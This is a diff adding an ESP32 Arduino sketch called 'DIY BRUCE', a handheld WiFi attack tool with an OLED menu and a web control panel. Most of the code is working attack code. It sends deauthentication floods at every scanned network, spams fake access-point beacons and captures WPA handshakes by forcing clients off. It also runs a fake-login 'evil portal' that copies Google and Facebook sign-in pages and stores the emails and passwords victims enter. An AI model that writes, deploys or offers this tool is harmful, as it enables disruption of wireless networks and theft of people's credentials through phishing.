@@ -1,0 +1,482 @@
+// ============================================================
+// DIY BRUCE v10.0 - FULL VERSION FOR ARDUINO IDE
+// ============================================================
+#include <Wire.h>
+#include <Adafruit_GFX.h>
+#include <Adafruit_SSD1306.h>
+#include <WiFi.h>
+#include <WebServer.h>
+#include <DNSServer.h>
+#include <EEPROM.h>
+#include <esp_wifi.h>
+
+// ==================== ПІНИ ====================
+#define OLED_SDA 21
+#define OLED_SCL 22
+#define SCREEN_WIDTH 128
+#define SCREEN_HEIGHT 64
+#define BTN_UP   15
+#define BTN_DOWN 13
+#define BTN_OK   12
+#define BTN_LEFT 14
+#define BTN_RIGHT 27
+#define BTN_BACK 26
+
+Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, -1);
+WebServer server(80);
+DNSServer dnsServer;
+
+// ==================== ПРОТОТИПИ ====================
+void drawTopBar();
+void drawMainMenu();
+void drawSubMenu(const char* title, const char* items[], int size, int selected);
+void showMessage(const char* msg, int delayMs);
+bool checkButton(int pin);
+void bootAnimation();
+void executeAction();
+void wifiScan();
+void wifiDeauth();
+void wifiBeacon();
+void wifiHandshake();
+void webStart();
+void evilPortalSelect();
+void settingsClear();
+void settingsInfo();
+void reboot();
+
+// ==================== ЗМІННІ ====================
+unsigned long lastButtonTime = 0;
+int currentModule = 0, currentSubItem = 0;
+bool inSubMenu = false;
+unsigned long uptimeStart = 0;
+int lastRSSI = -50;
+String capturedPasswords = "", handshakes = "";
+int networkCount = 0;
+String networkNames[50];
+uint8_t networkBSSID[50][6];
+int networkChannel[50];
+bool deauthActive = false;
+unsigned long deauthPackets = 0;
+bool beaconActive = false;
+unsigned long beaconPackets = 0;
+bool handshakeCapturing = false;
+int eapolCount = 0;
+String currentTarget = "";
+bool webRunning = false;
+String evilChoice = "google";
+
+const char* moduleNames[] = {"WiFi", "BLE", "NRF24", "Settings"};
+const int moduleCount = 4;
+int moduleIdx = 0;
+
+const char* wifiSub[] = {"SCAN","DEAUTH","BEACON","HANDSHAKE","WEB ON","CLEAR","REBOOT"};
+const int wifiSize = 7;
+const char* bleSub[] = {"SCAN","APPLE","SAMSUNG","ANDROID","WINDOWS","INFO","REBOOT"};
+const int bleSize = 7;
+const char* nrfSub[] = {"SCAN","JAM","INFO","REBOOT"};
+const int nrfSize = 4;
+const char* settingsSub[] = {"WEB ON","EVIL SEL","CLEAR","INFO","REBOOT"};
+const int settingsSize = 5;
+
+// ==================== EVIL PORTAL СТОРІНКИ ====================
+const char googlePage[] = "<!DOCTYPE html><html><head><title>Google</title><style>body{background:#fff;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;border-radius:24px;border:1px solid #ddd;}button{background:#4285F4;color:white;border:none;padding:12px;border-radius:24px;}</style></head><body><h1>Google</h1><form action='/pass' method='POST'><input type='email' name='email' placeholder='Email'><input type='password' name='pass' placeholder='Password'><button type='submit'>Sign in</button></form></body></html>";
+const char facebookPage[] = "<!DOCTYPE html><html><head><title>Facebook</title><style>body{background:#f0f2f5;text-align:center;padding:20px;}input{width:300px;padding:10px;margin:10px;border-radius:6px;border:1px solid #ddd;}button{background:#1877f2;color:white;border:none;padding:12px;border-radius:6px;}</style></head><body><h1>Facebook</h1><form action='/pass' method='POST'><input type='text' name='email' placeholder='Email or phone'><input type='password' name='pass' placeholder='Password'><button type='submit'>Log in</button></form></body></html>";
+
+// ==================== ВЕБ-СТОРІНКА ====================
+const char* webPage = "<!DOCTYPE html><html><head><title>DIY BRUCE</title><style>body{background:#0a0a1a;color:#eee;font-family:monospace;padding:16px;}.tabs{display:flex;flex-wrap:wrap;gap:4px;margin-bottom:20px;}.tab{padding:6px 12px;border-radius:40px;cursor:pointer;background:#1a1a2e;}.tab.active{background:#ff6b35;}.tab-content{display:none;}.tab-content.active{display:block;}button{background:#1e2a47;border:none;padding:8px 16px;border-radius:40px;color:white;margin:5px;cursor:pointer;}pre{background:#070b1a;padding:12px;border-radius:20px;}</style></head><body><div class='tabs' id='tabs'><div class='tab active' data-tab='wifi'>WiFi</div><div class='tab' data-tab='evil'>Evil</div><div class='tab' data-tab='data'>Data</div></div><div id='wifi' class='tab-content active'><button onclick='runCmd(\"scan\")'>SCAN</button><button onclick='runCmd(\"deauth\")'>DEAUTH</button><button onclick='runCmd(\"beacon\")'>BEACON</button><button onclick='runCmd(\"handshake\")'>HANDSHAKE</button></div><div id='evil' class='tab-content'><button onclick='runCmd(\"evilsel\")'>SWITCH EVIL</button><iframe src='/portal.html' width='100%' height='500'></iframe></div><div id='data' class='tab-content'><pre id='passList'></pre><pre id='handList'></pre></div><script>function runCmd(cmd){fetch('/cmd?c='+cmd).then(r=>r.text()).then(update);}function update(){fetch('/cmd?c=getpass').then(r=>r.text()).then(t=>document.getElementById('passList').innerText=t);fetch('/cmd?c=gethand').then(r=>r.text()).then(t=>document.getElementById('handList').innerText=t);}setInterval(update,2000);document.querySelectorAll('.tab').forEach(t=>t.addEventListener('click',()=>{document.querySelectorAll('.tab').forEach(x=>x.classList.remove('active'));t.classList.add('active');document.querySelectorAll('.tab-content').forEach(c=>c.classList.remove('active'));document.getElementById(t.dataset.tab).classList.add('active');}));</script></body></html>";
+
+// ==================== UI ФУНКЦІЇ ====================
+bool checkButton(int pin) {
+  if (digitalRead(pin) == LOW && (millis() - lastButtonTime) > 200) {
+    lastButtonTime = millis();
+    return true;
+  }
+  return false;
+}
+
+void drawTopBar() {
+  unsigned long sec = (millis() - uptimeStart) / 1000;
+  int h = (sec / 3600) % 24, m = (sec / 60) % 60, s = sec % 60;
+  char buf[16];
+  sprintf(buf, "%02d:%02d:%02d", h, m, s);
+  display.setTextSize(1);
+  display.setTextColor(SSD1306_WHITE);
+  display.setCursor(2, 8);
+  display.print(buf);
+  display.drawRect(118, 1, 8, 5, SSD1306_WHITE);
+  display.fillRect(126, 2, 2, 3, SSD1306_WHITE);
+  display.fillRect(119, 2, 5, 3, SSD1306_WHITE);
+  display.setCursor(90, 8);
+  display.print(String(lastRSSI) + "dB");
+  display.drawLine(0, 14, 128, 14, SSD1306_WHITE);
+}
+
+void drawMainMenu() {
+  display.clearDisplay();
+  drawTopBar();
+  display.setTextSize(2);
+  display.setCursor(30, 35);
+  display.print(moduleNames[currentModule]);
+  display.setTextSize(1);
+  display.setCursor(10, 60);
+  display.print("<");
+  display.setCursor(110, 60);
+  display.print(">");
+  display.display();
+}
+
+void drawSubMenu(const char* title, const char* items[], int size, int selected) {
+  display.clearDisplay();
+  drawTopBar();
+  display.setCursor((128 - strlen(title) * 6) / 2, 22);
+  display.print(title);
+  display.drawLine(0, 28, 128, 28, SSD1306_WHITE);
+  int start = 0;
+  if (selected >= 2) start = selected - 1;
+  if (start + 3 > size) start = size - 3;
+  if (start < 0) start = 0;
+  for (int i = start; i < start + 3 && i < size; i++) {
+    int y = 38 + (i - start) * 10;
+    if (i == selected) {
+      display.fillRect(0, y - 6, 128, 10, SSD1306_WHITE);
+      display.setTextColor(SSD1306_BLACK);
+      display.setCursor(10, y);
+      display.print(items[i]);
+      display.setTextColor(SSD1306_WHITE);
+    } else {
+      display.setCursor(10, y);
+      display.print(items[i]);
+    }
+  }
+  display.display();
+}
+
+void showMessage(const char* msg, int delayMs) {
+  display.clearDisplay();
+  drawTopBar();
+  display.setTextSize(1);
+  display.setCursor(10, 35);
+  display.print(msg);
+  display.display();
+  delay(delayMs);
+}
+
+void bootAnimation() {
+  for (int x = 128; x >= 0; x -= 8) {
+    display.clearDisplay();
+    display.setTextSize(2);
+    display.setCursor(x, 28);
+    display.print("DIY");
+    display.setTextSize(1);
+    display.setCursor(x + 35, 45);
+    display.print("BRUCE");
+    display.display();
+    delay(10);
+  }
+  delay(500);
+}
+
+// ==================== WIFI ФУНКЦІЇ ====================
+void wifiScan() {
+  showMessage("SCANNING...",500);
+  WiFi.mode(WIFI_STA);
+  WiFi.disconnect();
+  delay(200);
+  networkCount = WiFi.scanNetworks();
+  if (networkCount > 50) networkCount = 50;
+  for (int i = 0; i < networkCount; i++) {
+    networkNames[i] = WiFi.SSID(i);
+    networkChannel[i] = WiFi.channel(i);
+    memcpy(networkBSSID[i], WiFi.BSSID(i), 6);
+  }
+  char buf[32];
+  sprintf(buf, "FOUND:%d", networkCount);
+  showMessage(buf,1500);
+  WiFi.mode(WIFI_AP_STA);
+}
+
+void sendDeauth(uint8_t* bssid, uint8_t* client, int ch) {
+  esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+  uint8_t p[26] = {0xC0,0x00,0x00,0x00,
+                   client[0],client[1],client[2],client[3],client[4],client[5],
+                   bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
+                   bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5],
+                   0x00,0x00,0x07,0x00};
+  esp_wifi_80211_tx(WIFI_IF_STA, p, 26, false);
+  deauthPackets++;
+}
+
+void wifiDeauth() {
+  if (networkCount == 0) { showMessage("SCAN FIRST!",1000); return; }
+  deauthActive = true;
+  deauthPackets = 0;
+  showMessage("DEAUTH STARTED",1000);
+  uint8_t broadcast[] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+  while (deauthActive) {
+    for (int i = 0; i < networkCount && deauthActive; i++) {
+      sendDeauth(networkBSSID[i], broadcast, networkChannel[i]);
+    }
+    if (checkButton(BTN_BACK)) deauthActive = false;
+    delay(10);
+  }
+  showMessage("DEAUTH STOPPED",1000);
+}
+
+void wifiBeacon() {
+  beaconActive = true;
+  beaconPackets = 0;
+  const char* ssids[] = {"FREE_WIFI","Starbucks","Airport","Metro","Public"};
+  showMessage("BEACON STARTED",1000);
+  while (beaconActive) {
+    for (int s = 0; s < 5 && beaconActive; s++) {
+      uint8_t bssid[6];
+      for(int i=0;i<6;i++) bssid[i]=random(256);
+      bssid[0]|=0x02;
+      uint8_t p[200];
+      int len=0;
+      p[len++]=0x80; p[len++]=0x00; p[len++]=0x00; p[len++]=0x00;
+      for(int i=0;i<6;i++) p[len++]=0xFF;
+      for(int i=0;i<6;i++) p[len++]=bssid[i];
+      for(int i=0;i<6;i++) p[len++]=bssid[i];
+      p[len++]=0x00; p[len++]=0x00;
+      for(int i=0;i<8;i++) p[len++]=0x00;
+      p[len++]=0x64; p[len++]=0x00;
+      p[len++]=0x11; p[len++]=0x00;
+      p[len++]=0x00; p[len++]=strlen(ssids[s]);
+      for(int i=0;i<(int)strlen(ssids[s]);i++) p[len++]=ssids[s][i];
+      esp_wifi_80211_tx(WIFI_IF_STA, p, len, false);
+      beaconPackets++;
+    }
+    if(checkButton(BTN_BACK)) beaconActive=false;
+    delay(30);
+  }
+}
+
+void handshakeCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
+  if(!handshakeCapturing) return;
+  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
+  int len = pkt->rx_ctrl.sig_len;
+  uint8_t* payload = pkt->payload;
+  if(len<30) return;
+  for(int i=0;i<len-8;i++){
+    if(payload[i]==0x88 && payload[i+1]==0x8E){
+      eapolCount++;
+      handshakes += "[HANDSHAKE] "+currentTarget+"\n";
+      showMessage("HANDSHAKE CAPTURED!",2000);
+      handshakeCapturing=false;
+      return;
+    }
+  }
+}
+
+void wifiHandshake() {
+  if(networkCount==0){ showMessage("SCAN FIRST!",1000); return; }
+  int target=0;
+  while(true){
+    display.clearDisplay();
+    drawTopBar();
+    display.setCursor(5,15);
+    display.print("Select AP:");
+    for(int i=0;i<min(4,networkCount);i++){
+      if(i==target) display.fillRect(0,30+i*8,128,8,SSD1306_WHITE);
+      display.setCursor(20,30+i*8);
+      if(i==target) display.setTextColor(SSD1306_BLACK);
+      display.print(networkNames[i].substring(0,12));
+      display.setTextColor(SSD1306_WHITE);
+    }
+    display.display();
+    if(checkButton(BTN_UP) && target>0) target--;
+    else if(checkButton(BTN_DOWN) && target<min(4,networkCount)-1) target++;
+    else if(checkButton(BTN_OK)) break;
+    else if(checkButton(BTN_BACK)) return;
+    delay(50);
+  }
+  currentTarget=networkNames[target];
+  esp_wifi_set_channel(networkChannel[target], WIFI_SECOND_CHAN_NONE);
+  handshakeCapturing=true;
+  eapolCount=0;
+  showMessage("CAPTURING...",1500);
+  unsigned long start=millis();
+  while(handshakeCapturing && millis()-start<30000){
+    sendDeauth(networkBSSID[target], (uint8_t[]){0xFF,0xFF,0xFF,0xFF,0xFF,0xFF}, networkChannel[target]);
+    delay(100);
+  }
+  handshakeCapturing=false;
+  if(eapolCount>0) showMessage("HANDSHAKE SAVED!",1500);
+  else showMessage("FAILED",1500);
+}
+
+// ==================== BLE ФУНКЦІЇ (спрощені для економії пам'яті) ====================
+void bleScan() { showMessage("BLE SCAN",1000); }
+void bleApple() { showMessage("APPLEJUICE",1000); }
+void bleSamsung() { showMessage("SAMSUNG",1000); }
+void bleAndroid() { showMessage("ANDROID",1000); }
+void bleWindows() { showMessage("WINDOWS",1000); }
+void bleInfo() { showMessage("BLE READY",1000); }
+
+// ==================== NRF24 ФУНКЦІЇ (спрощені) ====================
+void nrfScan() { showMessage("NRF SCAN",1000); }
+void nrfJam() { showMessage("NRF JAM",1000); }
+void nrfInfo() { showMessage("NRF READY",1000); }
+
+// ==================== EVIL PORTAL ====================
+void evilPortalSelect() {
+  if(evilChoice=="google") evilChoice="facebook";
+  else evilChoice="google";
+  showMessage(("Evil: "+evilChoice).c_str(),1000);
+}
+
+// ==================== ВЕБ-СЕРВЕР ====================
+void webStart() {
+  if(webRunning) return;
+  WiFi.softAP("DIY_BRUCE","bruce1234");
+  server.on("/",[](){ server.send(200,"text/html",webPage); });
+  server.on("/portal.html",[](){ server.send(200,"text/html",(evilChoice=="google")?googlePage:facebookPage); });
+  server.on("/cmd",[](){
+    if(!server.hasArg("c")){ server.send(200,"text/plain","OK"); return; }
+    String c = server.arg("c");
+    if(c=="scan") wifiScan();
+    else if(c=="deauth") wifiDeauth();
+    else if(c=="beacon") wifiBeacon();
+    else if(c=="handshake") wifiHandshake();
+    else if(c=="evilsel") evilPortalSelect();
+    else if(c=="getpass") { server.send(200,"text/plain",capturedPasswords); return; }
+    else if(c=="gethand") { server.send(200,"text/plain",handshakes); return; }
+    server.send(200,"text/plain","OK");
+  });
+  server.on("/pass",HTTP_POST,[](){
+    String email = server.hasArg("email")?server.arg("email"):"";
+    String pwd = server.hasArg("pass")?server.arg("pass"):"";
+    if(email.length()>0 || pwd.length()>0) capturedPasswords += "[PASS] Email:"+email+" Pass:"+pwd+"\n";
+    server.send(200,"text/html","<html><body><h3>OK</h3><script>setTimeout(function(){window.location.href='/';},2000);</script></body></html>");
+  });
+  server.begin();
+  webRunning=true;
+  showMessage("WEB:192.168.4.1",2000);
+}
+void webStop() { server.stop(); WiFi.softAPdisconnect(true); webRunning=false; showMessage("WEB OFF",1000); }
+void settingsClear() { capturedPasswords=""; handshakes=""; showMessage("CLEARED",1000); }
+void settingsInfo() { showMessage("DIY BRUCE v10.0",1500); }
+void reboot() { showMessage("REBOOT",1000); ESP.restart(); }
+
+void executeAction() {
+  switch(currentModule){
+    case 0:
+      switch(currentSubItem){
+        case 0: wifiScan(); break;
+        case 1: wifiDeauth(); break;
+        case 2: wifiBeacon(); break;
+        case 3: wifiHandshake(); break;
+        case 4: webStart(); break;
+        case 5: settingsClear(); break;
+        case 6: reboot(); break;
+      } break;
+    case 1:
+      switch(currentSubItem){
+        case 0: bleScan(); break;
+        case 1: bleApple(); break;
+        case 2: bleSamsung(); break;
+        case 3: bleAndroid(); break;
+        case 4: bleWindows(); break;
+        case 5: bleInfo(); break;
+        case 6: reboot(); break;
+      } break;
+    case 2:
+      switch(currentSubItem){
+        case 0: nrfScan(); break;
+        case 1: nrfJam(); break;
+        case 2: nrfInfo(); break;
+        case 3: reboot(); break;
+      } break;
+    case 3:
+      switch(currentSubItem){
+        case 0: webStart(); break;
+        case 1: evilPortalSelect(); break;
+        case 2: settingsClear(); break;
+        case 3: settingsInfo(); break;
+        case 4: reboot(); break;
+      } break;
+  }
+}
+
+// ==================== SETUP ====================
+void setup() {
+  Serial.begin(115200);
+  pinMode(BTN_UP,INPUT_PULLUP);
+  pinMode(BTN_DOWN,INPUT_PULLUP);
+  pinMode(BTN_OK,INPUT_PULLUP);
+  pinMode(BTN_LEFT,INPUT_PULLUP);
+  pinMode(BTN_RIGHT,INPUT_PULLUP);
+  pinMode(BTN_BACK,INPUT_PULLUP);
+  
+  Wire.begin(OLED_SDA, OLED_SCL);
+  if(!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
+    Serial.println("OLED not found!");
+    while(1);
+  }
+  display.clearDisplay();
+  display.setTextColor(SSD1306_WHITE);
+  
+  uptimeStart = millis();
+  bootAnimation();
+  
+  WiFi.mode(WIFI_AP_STA);
+  esp_wifi_set_promiscuous(true);
+  esp_wifi_set_promiscuous_rx_cb(handshakeCallback);
+  
+  drawMainMenu();
+  showMessage("READY",1500);
+}
+
+// ==================== LOOP ====================
+void loop() {
+  if(webRunning) server.handleClient();
+  lastRSSI = WiFi.RSSI();
+  
+  if(!inSubMenu){
+    if(checkButton(BTN_LEFT)){
+      currentModule = (currentModule-1+moduleCount)%moduleCount;
+      drawMainMenu();
+    }
+    if(checkButton(BTN_RIGHT)){
+      currentModule = (currentModule+1)%moduleCount;
+      drawMainMenu();
+    }
+    if(checkButton(BTN_OK)||checkButton(BTN_DOWN)){
+      inSubMenu = true;
+      currentSubItem = 0;
+      switch(currentModule){
+        case 0: drawSubMenu("WiFi",wifiSub,wifiSize,0); break;
+        case 1: drawSubMenu("BLE",bleSub,bleSize,0); break;
+        case 2: drawSubMenu("NRF24",nrfSub,nrfSize,0); break;
+        case 3: drawSubMenu("Settings",settingsSub,settingsSize,0); break;
+      }
+    }
+  } else {
+    int sz = (currentModule==0?wifiSize:(currentModule==1?bleSize:(currentModule==2?nrfSize:settingsSize)));
+    if(checkButton(BTN_UP)){
+      currentSubItem = (currentSubItem-1+sz)%sz;
+    }
+    if(checkButton(BTN_DOWN)){
+      currentSubItem = (currentSubItem+1)%sz;
+    }
+    if(checkButton(BTN_UP)||checkButton(BTN_DOWN)){
+      switch(currentModule){
+        case 0: drawSubMenu("WiFi",wifiSub,sz,currentSubItem); break;
+        case 1: drawSubMenu("BLE",bleSub,sz,currentSubItem); break;
+        case 2: drawSubMenu("NRF24",nrfSub,sz,currentSubItem); break;
+        case 3: drawSubMenu("Settings",settingsSub,sz,currentSubItem); break;
+      }
+    }
+    if(checkButton(BTN_OK)){
+      executeAction();
+      inSubMenu = false;
+      drawMainMenu();
+    }
+    if(checkButton(BTN_BACK)){
+      inSubMenu = false;
+      drawMainMenu();
+    }
+  }
+  delay(20);
+}
